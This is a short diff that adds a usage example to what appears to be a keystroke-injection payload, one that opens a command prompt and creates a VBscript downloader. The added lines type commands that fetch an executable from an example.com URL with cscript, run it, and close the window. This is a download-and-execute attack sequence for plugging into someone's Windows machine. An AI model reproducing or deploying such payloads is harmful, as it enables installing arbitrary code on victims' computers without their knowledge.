@@ -38,3 +38,14 @@ Description: Opens the command prompt (not as administrator) creates a VBscript 
  STRING exit
  ENTER
  
+Example:
+
+ ...
+ ENTER
+ STRING cscript download.vbs http://example.com/fun_windows_executable.exe
+ ENTER
+ STRING fun_windows_executable.exe
+ ENTER
+ STRING exit
+ ENTER
+ 
